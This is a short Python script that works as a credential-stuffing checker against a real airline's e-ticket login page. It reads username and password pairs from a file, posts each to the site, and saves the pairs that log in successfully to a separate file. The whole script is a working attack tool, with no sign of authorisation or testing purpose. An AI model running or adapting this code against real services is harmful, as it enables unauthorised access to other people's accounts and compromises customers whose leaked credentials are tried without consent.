
#!/usr/bin/env python3
import requests

# URL and form details may need updates based on actual form fields
LOGIN_URL = "http://www.airsial.net/eticket/login"  # adjust if different
FORM_USER = "username"
FORM_PASS = "password"
SUCCESS_INDICATOR = "Welcome"  # string in page when login succeeds

def login(user, pwd):
    session = requests.Session()
    resp = session.post(LOGIN_URL, data={
        FORM_USER: user,
        FORM_PASS: pwd
    }, timeout=10)
    text = resp.text.lower()
    if SUCCESS_INDICATOR.lower() in text:
        return True, text[:200]
    return False, None

def main():
    with open("accounts.txt") as f:
        lines = [line.strip().split(",",1) for line in f if "," in line]

    for user, pwd in lines:
        print(f"[→] Trying {user} …", end="")
        try:
            ok, info = login(user, pwd)
            if ok:
                print("✅ SUCCESS")
                with open("logged_success.txt","a") as out:
                    out.write(f"{user},{pwd}\n")
                print("INFO SNIPPET:", info.replace("\n"," ")[:100])
            else:
                print("❌ FAILED")
        except Exception as e:
            print("⚠️ ERROR:", e)

if __name__ == "__main__":
    main()
